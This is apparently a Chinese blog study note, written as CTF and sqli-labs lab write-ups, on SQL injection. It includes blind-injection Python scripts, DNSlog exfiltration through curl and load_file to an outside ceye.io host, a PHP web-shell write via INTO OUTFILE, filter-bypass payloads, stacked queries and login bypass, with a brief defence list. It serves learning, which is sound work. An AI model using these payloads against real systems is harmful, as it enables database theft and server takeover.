+<p>我已经直接查flag了，因为的数据库结构和之前是一样的，因为过程一样所以之前的查库查表不在进行，我们输入了上述语句后可以看到网页给出提示<strong>query_success</strong>，说明我们flag表的flag字段的第一个字符时小写的C，因为ascii码为99。接下来怎么办，总不能自己一个一个实验吧，我们选择使用burp suit进行爆破，以两个字段，即substr里的第二个参数和最后的ascii值判断作为爆破的点，依次爆破就能得到flag了，（这是按照我学的视频里的方法，总感觉太慢了，所以我决定去看writeup，发现writeup是写了脚本，那我也写脚本吧，用个requests库就可以了，还不咋会，照着写了一个）</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+name<span class="token operator">=</span> <span class="token string">''</span>
+mark <span class="token operator">=</span> <span class="token string">'query_success'</span>
+urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-62b5ddccaa603532.sandbox.ctfhub.com:10080/?id='</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#substr子段</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#ascii值子段</span>
+        url <span class="token operator">=</span> urlOpen<span class="token operator">+</span><span class="token string">'1 and (select ascii(substr(flag,%d,1)) from flag)=%d'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>  <span class="token comment">#依次判断</span>
+        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> mark <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>  <span class="token comment">#可以知道比对成功就是query_sucess,所以以此作为判断</span>
+            name<span class="token operator">=</span>name<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后就可以输出了flag了，前面查询库，表也和这个类似，只是sql语句换一下罢了，这里就偷懒了</p>
+<p>对于这种脚本最好用二分法进行优化一下，不然会很慢的，自己写一下挺简单的，会快不少。</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>也叫时间延时注入，这种注入在我们输入单引号，双引号，小括号时他都不会显示出报错（但其实是已经出错了），页面不会改变，这时候就需要通过if(),sleep()函数，使得我们的判断条件为真时会有页面延时的情况出现，即，构造好了语句，如果我们想要判断的条件为真，则页面执行会出现延迟，如果为假则不会有延迟。给出一个语句实例：<code>?id=-1 or if(select ascii(substr(table_name,1,1)) from informatio_schema.tables where tabel_schema=database() limit 0,1)=100,sleep(2),0) #</code></p>
+<p>首先看一下if()和sleep()</p>
+<ul>
+<li>if(expr1,expr2,expr3)<ul>
+<li>第一个参数是要判断真假的语句</li>
+<li>如果为真，执行第二个参数</li>
+<li>为假执行第三个参数</li>
+</ul>
+</li>
+<li>sleep():等待多少秒执行啊</li>
+</ul>
+<p>我们所做的查询即第一个if参数，是需要判断真假的，其语法和布尔盲注一样，需要以此判断字符是多少，如果为真则会sleep两秒，可以看到执行时页面会有两秒的加载时间，如果为假，则不会有两秒的加载时间，以此判断即可</p>
+<p><strong><em>这种手动做的话肯定不现实，需要借助工具或者写脚本，还是强调，这里只是原理</em></strong></p>
+<p>还是以ctfhub的时间注入作为实例，还是写脚本解决，首先先测试一下：<code> http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1 or if((select ascii(substr(database(),1,1))=115),sleep(2),0) #</code></p>
+<p>可以看到等于115时可以产生延时，那就按照这个语法写脚本就好了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">name<span class="token operator">=</span><span class="token string">''</span>
+urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># url=urlOpen+' or if((select ascii(substr(database(),%d,1)))=%d,sleep(2),0) #'%(i,j) #库名</span>
+        <span class="token comment"># url = urlOpen +' or if((select ascii(substr(table_name,%d,1) from information_schema.tables where table_schema=\'sqli\')=%d),sleep(2),0) #'%(i,j)</span>
+        url <span class="token operator">=</span> urlOpen <span class="token operator">+</span><span class="token string">' or if((select ascii(substr(flag,%d,1)) from flag)=%d,sleep(1),0) #'</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
+        time1<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        time2<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> time2<span class="token operator">-</span>time1<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">:</span>
+            name<span class="token operator">=</span>name<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跑出来就好了，但发现跑的过程很艰辛，因为原理是时间延迟，所以如果网络不畅或者requests超时啥的会让人很头疼，可能出现一些错误的字符。。。跑了好多次。。。依旧失败了，每次都有flag结构但都会有些位出错，我选择sqlmap了。。。**<em>哈哈哈，最后一次脚本和sqlmap同时跑脚本先跑出来了，真的是网络原因，不稳定是真滴难受**</em></p>
+<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p>在使用布尔，时间盲注的时候回造成很大的访问量，在一些时候回触发目标网站的安全机制，造成拦截，这时可以用到dnslog注入，可以一次性的得到数据库内容，再通过对其的自动化，可以大大提高注入效率。</p>
+<p>dnslog注入的原理就是进行DNS解析时，dns服务器会记录访问信息，<strong>比如访问的域名</strong>，这些信息就可以用于DNS解析。通过Dnslog平台，可以看到这些信息，实现注入</p>
+<p>这里记录一些dnslog平台：<br><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p>通过平台给的url，在linux上使用命令curl xxx.dfaf.ceye.io，接下来即可在平台上找到相关信息,</p>
+<p>当我们输入命令</p>
+<pre class="line-numbers language-none"><code class="language-none">curl &#96;whoami&#96;.dfaf.ceye.io
+# 在linux中&#96;&#96;中的内容会被直接作为命令执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>再在平台中就可以看到会记录到<a target="_blank" rel="noopener" href="http://ado.dfaf.ceye.io,这里的ado就是whoami的执行内容,这里就是实现dnslog注入的基础./">http://ado.dfaf.ceye.io，这里的ado就是whoami的执行内容，这里就是实现dnslog注入的基础。</a></p>
+<p>而在MYSQL中，可以通过LOAD_FILE函数发起请求，实现dnslog注入，示例如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">select load_file(concat(&#39;\\\\&#39;,&#39;test&#39;,&#39;.ahh.dfaf.ceye.io\\abc123&#39;));
+# 请求后平台就会记录到信息：
+test.ahh.dfaf.ceye.io
+select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.ahh.dfaf.ceye.io\\abc123&#39;));
+# 这样就可以查找出database了 ，注意，select语句这里数据格式和内容有限制，比如不能有@，~等特殊字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>注意，load_file发起请求只能在window上进行，linux不行，所以目标数据库必须在windows系统上，且需要足够的系统权限，即MYSQL的my.ini配置文件中secure_file_priv需要设置,因为其默认是NULL，即不允许读取文件，将其设置为””,即可实现dnslog注入</strong></p>
+<p><img src="/images/image-20210719144639950.png"></p>
+<p>可以看到此时为空，就可以实现dnslog注入了，这里以sqlilab的时间盲注做实验：</p>
+<p><img src="/images/image-20210719151513063.png"></p>
+<p>可以在dnslog平台看到：</p>
+<p><img src="/images/image-20210719151550164.png"></p>
+<p>说明查到表了，接下来就是在select语句做更改即可</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit 2,1),&#39;.mysql.m1j8ro.ceye.io\\aaa&#39;))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/image-20210719152145197.png"></p>
+<p>接下来的步骤不做记录，注意，每次只能查一条，也不能group_concat(),要想更快不手动更改limit可以使用对应的脚本。</p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>就是注入点在cookie中，cookie是啥不再介绍，我们需要在cookie处进行注入，具体注入方法按照环境来决定，需要自己慢慢的尝试，也是一个经验的问题。需要多练习，以ctfhub上的cookie注入来作为例子。使用burpsuite来进行注入</p>
+<p>打开题目告诉我们注入点变了，使用burp抓包</p>
+<p>可以看到cookie：</p>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: id&#x3D;1; hint&#x3D;id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们在id这里进行注入，在repeter里进行 </p>
+<p><code>Cookie: id=-1 union select 1,database();</code></p>
+<p>可以看到已经显示出了database，继续注入就好了，不再演示，最后的语句是<code>Cookie: id=-1 union select 1,group_concat(nuwjexalch) from nuyuogkrho;</code></p>
+<p>得到flag</p>
+<h3 id="http-Referer注入"><a href="#http-Referer注入" class="headerlink" title="http-Referer注入"></a>http-Referer注入</h3><p>及注入点在referer中，可以注意到在讲解视屏中除了可以看到，讲解人通过其报错信息发现，<strong>并不是通过select的语句进行注入，而是update或者insert</strong>，所以需要复习一下sql语句啊。。。所以其实重要的还是找到注入点和使其报错以及<strong>通过构造语句使其不报错</strong>，下面以ctfhub上的referer注入为实例进行实验，打开页面可以看到提示我们“请在referer输入id”，使用burpsuite进行抓包，抓了后看了一下，没有referer字段，需要自己构造，注意构造的格式，最开始就是因为构造格式不对所以错了</p>
+<p>最开始是这样构造的：</p>
+<pre class="line-numbers language-none"><code class="language-none">Referer: id&#x3D;1	#发现不对
+Referer: 1		#这样才对
+接下来继续注入就对了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><code>Referer: -1 union select 1,group_concat(hnsyfohxaa) from verizqvbgj</code></p>
+<p>这是最后的referer语句</p>
+<h3 id="sql注入读写文件"><a href="#sql注入读写文件" class="headerlink" title="sql注入读写文件"></a>sql注入读写文件</h3><p>读取文件是通过一个Load_file(file_name)函数来进行的对服务器上的文件的读取,这个函数有四个使用条件</p>
+<ul>
+<li>必须有权限读取并且文件必须完全可读</li>
+<li>欲读取文件必须在服务器上</li>
+<li>必须指定完整的路径</li>
+<li>欲读取文件大小必须小于max_allowed_packet</li>
+</ul>
+<p>还是先要判断注入点和注入类型，然后再在这里进行文件的读取，比如<code>?id=1&#39; union select 1,load_file(&quot;C:\\www\\sqli&quot;)</code>,然后在?id前的路径出写上想要访问的文件如:”index,php”</p>
+<p>写入文件：</p>
+<p>函数outfile(),和load_file很类似，比如</p>
+<p><code>?id=1&#39; union select 1,2,&quot;&lt;?php @eval($_POST[aaa];?&gt;&quot; into outfile &quot;C:\\www\\sqli\\a.txt&quot; #</code></p>
+<p>这样就将一个一句话木马写入了文件a.txt（注意，还是要有绝对路径和权限才行），这样就可上传一个一句话木马，再拿webshell、</p>
+<h3 id="绕过注释符过滤"><a href="#绕过注释符过滤" class="headerlink" title="绕过注释符过滤"></a>绕过注释符过滤</h3><p>简单的加注释消除报错失败，注释符会被过滤掉，这种时候我们需要使用别的方法来在发现注入点，报错后消除报错，这种时候需要对sql语法的熟练以及一些骚操作整除一些畸形的语句，使其闭合，在课程中讲解人使用的是?id=1’ or(select….) or’这样可以让语句闭合，也需要通过不断的实验以及分析报错的提醒来得到正确的语法</p>
+<p>这里以sqli的less-23作为演示</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39;</code>这样可以得到报错，但我们加#或者–+都无法消除报错，且<code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; %23 a</code>会看到页面上显示的错误是在<strong>a</strong> 附近，没有我们的注释符的影子，这种时候就该考虑注释被过滤掉了，要使用新的方法使其闭合。我们思考这时sql语句<code>select * from aaa where id=&#39;1&#39;&#39; limit 0,1</code> 要消除报错主要是要去掉单引号的影响，这时候用的是or，完整语句是这样的<code>select * from aaa where id=&#39;1&#39; or&#39;&#39; limit 0,1</code>这样可以消除报错，最后是使用两个or在or中间进行注入</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; or (select database()) or&#39;</code>这样不会报错，但显示不出database，使用报错注入</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; or (extractvalue(1,concat(0x7e,database()))) or &#39;</code></p>
+<p>这样就可以得到database了，database换为select就可以得到想要的了，</p>
+<p>对这种微妙也可以使用union select加单引号来进行绕过，也是通过单引号使其闭合</p>
+<h3 id="绕过or-and过滤注入"><a href="#绕过or-and过滤注入" class="headerlink" title="绕过or-and过滤注入"></a>绕过or-and过滤注入</h3><p>我们也可以通过一些报错看到and和or被过滤了，可以先使用大小写试试，不行就换思路，比如使用||来代替or，使用&amp;&amp;来代替and，看哪些不被过滤，所以也就是一些绕过的姿势，以sqli-less-25为例子，<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=1&#39;  %23</code>可以看到这样已经可以消除报错，但是使用orderby时发现会报错，<code> near &#39;der by #&#39;</code>在order前加个a，报错为<code> use near &#39;ader by #&#39;</code>,可以发现or被过滤掉了，这里我们直接用union select就可以解决<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=-1&#39;  union select 1,2,3 %23</code>可以查询，然后再注入就好了，同时，我们也可以使用||来代替or来进行注入，<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=-1&#39;  || (extractvalue(1,concat(0x7e,database()))) %23</code>这样也可以进行注入</p>
+<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>同样的，可以通过报错可以看到我们在一些语句中空格被过滤掉了，比如我们使用select database(),会报错selectdatabse 不存在报错<code>FUNCTION security.selectextractvalue does not exist</code>，注意空格没了，这时候就考虑时空格绕过，绕过空格我们使用转义来表示空格字符，常用有以下几种，因为系统原因所以需要都进行测试，</p>
+<ul>
+<li>%09 tab键（水平）</li>
+<li>%0a 新建一行</li>
+<li>%0c 新的一页</li>
+<li>%0d return功能</li>
+<li>%0b tab键（垂直）</li>
+<li>%a0 空格</li>
+<li>/**/ 代替空格</li>
+<li>/*!*/ 代替空格</li>
+</ul>
+<p>以sqli-less-26 作为例子</p>
+<p>这是个混合题，过滤了注释和or，所以最后的写法是</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-26/?id=1&#39; || (select/*!*/extractvalue(1,concat(0x7e,database()))) || &#39;</code></p>
+<p>虽然这里的报错注入其实用不到select但为了解释空格绕过使用了，也一样，视频里用%a0绕过的，这里不知道为什么不行，最后使用/*!*/ 才绕过了，后续就不查了，一样的。</p>
+<p>做了一下ctfhub的空格绕过，发现第二步使其闭合就卡住了，怎么都不能闭合，但是并没有影响注入。。。因为是过滤空格，所以直接替换空格就行了。。。</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=1/**/order/**/by/**/2</code></p>
+<p>这样就能显示了，</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()</code></p>
+<p>查表</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#39;ppaymrtivl&#39;</code></p>
+<p>查列</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(nalhiirshz)/**/from/**/ppaymrtivl</code></p>
+<p>得到flag，总觉得ctfhub的环境怪怪的，不能闭合还是能继续往下走<del>肯定不是我的问题</del></p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>这里视频里是用的less-27作为环境，使用内联注释绕过失败了，<del>尴尬</del>但方法得记住，内联注释就是将被过滤掉的语句使用/*!*/包裹起来，比如如果select被过滤掉了则我们使用/*!select*/来进行包裹，可能能绕过过滤，视频里这样不知道为啥失败了，老师使用了另外两种方法，一是大小写，比如写成selEct,以及拼接，在select中再放一个select<code>selselectect</code>这样中间的完整的select被过滤掉以后外层的拼接起来就好了。<del>大概就是这样，不想实验了，累了</del></p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当<strong>MySQL使用GBK</strong>作为编码时会用两个字节作为汉字，有的时候网站会通过<strong>加上反斜杠</strong>来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入。</p>
+<p>以less-33为例子</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1&#39;</code></p>
+<p>加入单引号后没有报错，页面上显示出hint：Hint: The Query String you input is escaped as : 1\‘</p>
+<p>单引号前有一个反斜杠，我们的单引号被过滤掉了，下一行hint：The Query String you input in Hex becomes : 315c27，我们输入的id=1\‘的编码时这么多，我们知道，反斜杠的编码时%5c，如果我们在其之前加入另外的编码使其成为宽字节，就可以去掉反斜杠了，查询GBK的范围，选择一个，%df，这样df5c属于宽字节，加入%df后形成的新字节被MYSQL忽视，反斜杠也没了，这样我们的单引号就又起作用了，具体语法为<code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1%df&#39;</code></p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=-1%df&#39; union select 1,2,database() %23</code></p>
+<p>这样已经成功注入了。后续不表</p>
+<p>防范：</p>
+<ul>
+<li>使用utf-8编码</li>
+<li>使用mysqlreal_escape_string.函数，同时使用mysql_set_charset(‘gbk’, $conn);即可防御</li>
+<li>可以设置参数，character_set_client= binary</li>
+</ul>
+<p><strong>对于对单引号的过滤，宽字节无法使用时，可以使用16进制的方式尝试绕过</strong>，比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1 from aa where name &#x3D;&#39;abc&#39; 如果单引号被过滤那么where后就不能被执行，这时候就将abc转化为16进制，即where name&#x3D;0x616263即可绕过<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>当php中使用了urldecode函数，且放置位置不恰当时，会和php本身的编码配合失误，造成漏洞。当我们输入?id=1’时网站加上反斜杠，但当我们使用二次编码注入就可以绕过，具体如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">id&#x3D;%2527，通过php自身编码，%25被转译为&quot;%&quot;，此时为id&#x3D;%27,若使用了urldecode函数，%27被转译为单引号，就不会被加上反斜杠了 
+%25是&quot;%&quot;，%27是&quot;&#39;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>黑盒测试可以使用id=%2527来测试，白盒可以先看有没有使用urldecode函数，且其使用位置是否合理</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单来说就是在一个语句后面加上分号<code>;</code>,这代表着这一条语句的结束，分号后面继续写别的语句，这样我们写的语句就会和前面的语句一起执行，比如</p>
+<p><code>select * from user where id =1;select * from data</code></p>
+<p>在id后加上一个分号，就可以继续执行下一条。</p>
+<blockquote>
+<p>但是并不是说堆叠注入所有时候都可以用</p>
+<ul>
+<li>可能受到 API或者数据库引擎 不支持的限制，此外，在权限不足的情况也不能成功执行。</li>
+<li>虽然堆叠查询可以执行任意的 sql 语句，但是页面一般只能显示前一条语句执行结果，第二条语句我们无法得知它是否执行成功，第二个语句产生错误或者结果只能被忽略。</li>
+</ul>
+</blockquote>
+<p>和union执行的区别就是union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。比如insert或者delete语句，很多时候我们会在堆叠注入中使用<code>show</code>语句，来查看我们想要的数据，比如 show databases;以及<code>desc</code>命令,用于查看表结构的详细信息，比如 desc flag;**有的时候desc后的值需要使用反引号包裹。</p>
+<p>这里记录[[强网杯 2019]随便注 1]的一道题目writeup</p>
+<p>使用的就是堆叠注入以及一些骚操作<strong>其实主要是我对sql语句并不熟练，只会一些最基本的</strong>，来看一下这一题</p>
+<p>使用单引号，报错，加–+消除成功，order by，但union的时候返回了select被过滤的情况，怎么也绕不过去，看到使用?inject=1’ or 1=1 #可以看到更多的信息，接下来使用堆叠注入，首先inject=1’;show databases;可以看到数据库，show tables；看到两张表</p>
+<p><img src="/images/image-20201008193146206.png" alt="两张表"></p>
+<p>使用 desc分别查看，</p>
+<p>?inject=1’;desc words;</p>
+<p>?inject=1’;desc `1919810931114514`;（这里需要打反引号）</p>
+<p>可以看到flag在数字的这个表里，接下来的就是一些奇异的思路了。通过修改表名和字段名来获取flag，我们可以看到我们只有两个表，一个是words一个是数字的那个，观察当看words的具体内容和最开始的查询</p>
+<p><img src="/images/image-20201008194047954.png" alt="2"></p>
+<p>我们可以猜测正常的时候我们是在查words表里的id，data字段，我们将数字表改为words表，将flag字段改为id字段，就可以查出flag值了，直接给出构造的payload：</p>
+<p>?inject=1’;rename table words to words1;rename table `19198109311145` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</p>
+<p>rename table `words` to `www`;rename table `1919810931114514`  to `words`;alter table words change flag id varchar(100);#</p>
+<p>注意，下面这一行rename时每一个表名都加了反引号，我这里好像要这样才能改表名称，不然会显示words表不存在，以后最好还是都加上；最后用一个 ？inject=1’ or 1=1 –+就可以找到flag了；</p>
+<p>记录一下rename和alter函数。</p>
+<pre class="line-numbers language-none"><code class="language-none">rename命令格式：rename table 原表名 to 新表名;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">如需在表中添加列，请使用下面的语法:
+ALTER TABLE table_name ADD column_name datatype
+
+如需删除表中的列，请使用下面的语法（请注意，某些数据库系统不允许这种在数据库表中删除列的方式）：
+ALTER TABLE table_name DROP COLUMN column_name
+
+改变列的名称
+alter table table_name change a b integer(这个是数据类型，可以是varchar);
+
+要改变表中列的数据类型，请使用下面的语法：
+
+SQL Server &#x2F; MS Access：
+ALTER TABLE table_name ALTER COLUMN column_name datatype
+
+My SQL &#x2F; Oracle：
+ALTER TABLE table_name MODIFY COLUMN column_name datatype
+
+Oracle 10G 之后版本:
+ALTER TABLE table_name MODIFY column_name datatype;
+flag&#123;f28974b4-511c-4c6c-9c76-296efebc02e4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>记录一道题的解法，是[极客大挑战 2019]EasySQL的题目，</p>
+<p>登录后发现是get型传递参数，加单引号报错，可以看到是字符型，这里使用了一种<strong>万能密码</strong></p>
+<p><code>http://f8759e96-bef7-4955-bd4e-371420693b66.node3.buuoj.cn/check.php?username=admin&#39;or &#39;1&#39;=&#39;1&amp;password=admin&#39;or &#39;1&#39;=&#39;1</code></p>
+<p>首先使用一个单引号使用户名闭合，这时会判断我们的用户名是错的，然后执行or后面的语句，’1’=’1’成立，密码也这样，就能够登录了。    </p>
+<hr>
+<p>最后简单记录一下sql注入防御手段，</p>
+<ul>
+<li>代码层<ul>
+<li>黑名单（某些字符进入黑名单）</li>
+<li>白名单（比黑名单好）</li>
+<li>敏感字符过滤</li>
+<li>使用框架安全查询</li>
+<li>规范输出</li>
+</ul>
+</li>
+<li>配置层<ul>
+<li>开启GPC</li>
+<li>使用UTF-8</li>
+</ul>
+</li>
+<li>物理层<ul>
+<li>WAF</li>
+<li>数据库审计</li>
+<li>云防护</li>
+<li>IPS（入侵防御系统）</li>
+</ul>
+</li>
+</ul>
+<p><strong><em>小结一下，这些都只是最最基础的，在实际的题目中会有很多的骚操作，比如过滤掉逗号，过滤掉括号，需要大量的经验和骚操作，所以任重道远，需要未来更多的实践和学习，<del>这些是人学的东西，又多又杂，淦</del>比如过滤了逗号我们使用括号吧要用的括起来。</em></strong></p>
+<h2 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h2><p>上述描述了部分实际使用中的sql注入的方法，现在记录进行完整的sql注入的流程和其中需要注意的地方。</p>
+<p>可以将sql注入分为三个步骤：<strong>信息收集，数据获取，提权。</strong></p>
+<ul>
+<li>信息搜集：<ul>
+<li>数据库类型<ul>
+<li>通过报错等可以找到</li>
+</ul>
+</li>
+<li>数据库版本<ul>
+<li>version(),@@version,v$version</li>
+</ul>
+</li>
+<li>数据库用户<ul>
+<li>user(),SYSTEM_USER</li>
+</ul>
+</li>
+<li>数据库权限<ul>
+<li>super_priv,IS_SRVROLEMEMBER</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>获取信息<ul>
+<li>获取库信息</li>
+<li>获取表信息</li>
+<li>获取列信息</li>
+<li>获取数据</li>
+<li>通过语句查询，或者暴力破解（access通过暴力破解来判断有哪些表）</li>
+</ul>
+</li>
+<li>提权<ul>
+<li>执行命令（比如SQLServer sa权限）</li>
+<li>读文件（读中间配置文件，读数据库配置文件）</li>
+<li>写文件（写webshell到网站目录</li>
+</ul>
+</li>
+</ul>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入的原理是：虽然开发者对sql语句进行了过滤，比如在查询时，将<code>id=1&#39;</code>中单单引号进行转译，转化成了<code>id=1\&#39;</code>进行执行，如果将其这个数据存储到数据库中却是存储的原来的数据即<code>id=1&#39;</code>，开发者如果将已经在数据库中单信息视作安全，在后续调用该参数的时候没有再进行过滤转译，导致在读取时造成了注入，这就是二次注入点原理，这里以sql-labs-24为例做一个演示</p>
+<p>这一关的想法是通过二次注入来修改正常用户的密码，在开始时会进行用户注册，注册成功后登录该用户会要求该用户修改密码：</p>
+<p>首先注册一个test用户，密码test</p>
+<p><img src="/images/image-20210802142726344.png"></p>
+<p>再注册一个test’ #用户，密码为123：</p>
+<p>注意，此时sql语句中username被转义，是test\‘ #,但保存到数据库中的username却是test&#39; #</p>
+<p>登录test&#39; #修改密码为aaa</p>
+<p><img src="/images/image-20210802142837143.png"></p>
+<p>在数据库中可以看到</p>
+<p><img src="/images/image-20210802143229400.png"></p>
+<p>可以看到，密码被修改的是用户test而不是test&#39; #，这样我们就完成了对test用户账号的窃取</p>
+<p>看一下修改密码的源代码：</p>
+<p><img src="/images/image-20210802143504306.png"></p>
+<p>可以看见，在进行update时并没有进行过滤以及转义。</p>
